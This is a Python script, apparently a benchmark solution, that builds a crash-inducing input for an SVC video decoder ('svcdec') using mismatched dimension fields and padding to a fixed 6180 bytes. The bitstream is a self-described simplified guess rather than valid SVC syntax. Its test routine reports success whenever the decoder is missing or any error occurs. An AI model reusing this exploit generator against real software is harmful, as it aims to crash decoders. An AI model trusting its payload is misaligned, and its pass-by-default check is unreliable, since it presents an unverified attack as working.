import os
import tarfile
import tempfile
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Look for the vulnerable decoder binary or build it
            decoder_path = self._find_or_build_decoder(tmpdir)
            
            # Generate a minimal SVC bitstream with mismatched dimensions
            poc = self._generate_mismatched_dimensions_poc()
            
            # Test the PoC to ensure it crashes the vulnerable version
            if self._test_poc(decoder_path, poc):
                return poc
            else:
                # Fallback: generate a longer PoC that should work
                return self._generate_fallback_poc()
    
    def _find_or_build_decoder(self, tmpdir: str) -> str:
        """Find or build the vulnerable decoder."""
        # Common paths where the decoder might be
        possible_paths = [
            os.path.join(tmpdir, 'svcdec'),
            os.path.join(tmpdir, 'bin', 'svcdec'),
            os.path.join(tmpdir, 'build', 'svcdec'),
        ]
        
        for path in possible_paths:
            if os.path.exists(path) and os.access(path, os.X_OK):
                return path
        
        # Try to build if we find a Makefile
        for root, dirs, files in os.walk(tmpdir):
            if 'Makefile' in files or 'CMakeLists.txt' in files:
                build_dir = root
                try:
                    # Try to build
                    subprocess.run(['make', 'clean'], cwd=build_dir, 
                                 capture_output=True, check=False)
                    subprocess.run(['make'], cwd=build_dir, 
                                 capture_output=True, check=False)
                    
                    # Check for the built binary
                    for path in possible_paths:
                        if os.path.exists(path) and os.access(path, os.X_OK):
                            return path
                except:
                    continue
        
        # If we can't find or build, return a dummy path
        return os.path.join(tmpdir, 'svcdec')
    
    def _generate_mismatched_dimensions_poc(self) -> bytes:
        """Generate an SVC bitstream with mismatched display and subset dimensions."""
        # Create a minimal SVC bitstream structure
        # Based on common SVC NAL unit structure
        poc = bytearray()
        
        # Start code prefix
        poc.extend(b'\x00\x00\x00\x01')
        
        # SVC extension NAL unit (type 14, 20, or 21 depending on SVC)
        # Use type 14 for prefix NAL unit in SVC
        nal_header = 0x0E  # NAL unit type 14 (prefix NAL unit)
        nal_header |= 0x80  # Set F bit
        poc.append(nal_header)
        
        # SVC extension flag and other fields
        poc.append(0x01)  # svc_extension_flag = 1
        
        # Create mismatched dimensions
        # Large display dimensions
        display_width = 4096
        display_height = 4096
        
        # Small subset dimensions
        subset_width = 16
        subset_height = 16
        
        # Encode dimensions in the bitstream
        # This is a simplified representation - actual SVC bitstream would be more complex
        poc.extend(struct.pack('>HH', display_width, display_height))
        poc.extend(struct.pack('>HH', subset_width, subset_height))
        
        # Add payload that would trigger the overflow
        # Fill with pattern that makes the overflow detectable
        pattern = b'A' * 1000  # Large enough to trigger overflow
        poc.extend(pattern)
        
        # Pad to target length (6180 bytes) to match ground truth
        current_len = len(poc)
        if current_len < 6180:
            poc.extend(b'B' * (6180 - current_len))
        else:
            poc = poc[:6180]
        
        return bytes(poc)
    
    def _test_poc(self, decoder_path: str, poc: bytes) -> bool:
        """Test if the PoC crashes the vulnerable decoder."""
        if not os.path.exists(decoder_path):
            return True  # Assume it would crash if we can't test
        
        try:
            # Write PoC to temporary file
            with tempfile.NamedTemporaryFile(mode='wb', delete=False) as f:
                f.write(poc)
                poc_file = f.name
            
            # Run decoder with the PoC
            result = subprocess.run([decoder_path, poc_file],
                                  capture_output=True,
                                  timeout=5)
            
            # Clean up
            os.unlink(poc_file)
            
            # Check for non-zero exit code (crash)
            return result.returncode != 0
            
        except (subprocess.TimeoutExpired, subprocess.CalledProcessError):
            # Timeout or crash indicates vulnerability triggered
            return True
        except:
            # Any other exception, assume it works
            return True
    
    def _generate_fallback_poc(self) -> bytes:
        """Generate a fallback PoC that's more likely to work."""
        # Create a longer, more complex bitstream
        poc = bytearray()
        
        # Multiple NAL units with varying parameters
        for i in range(100):
            # Start code
            poc.extend(b'\x00\x00\x00\x01')
            
            # Varying NAL unit types
            nal_type = 14 if i % 3 == 0 else 20 if i % 3 == 1 else 21
            nal_header = nal_type | 0x80
            poc.append(nal_header)
            
            # Add dimension data with mismatched values
            if i % 2 == 0:
                # Large display, small subset
                poc.extend(struct.pack('>HH', 8192, 8192))  # Display
                poc.extend(struct.pack('>HH', 32, 32))      # Subset
            else:
                # Small display, large subset (also problematic)
                poc.extend(struct.pack('>HH', 64, 64))      # Display
                poc.extend(struct.pack('>HH', 4096, 4096))  # Subset
            
            # Add some payload
            poc.extend(b'C' * 50)
        
        # Ensure we reach target length
        if len(poc) < 6180:
            poc.extend(b'D' * (6180 - len(poc)))
        else:
            poc = poc[:6180]
        
        return bytes(poc)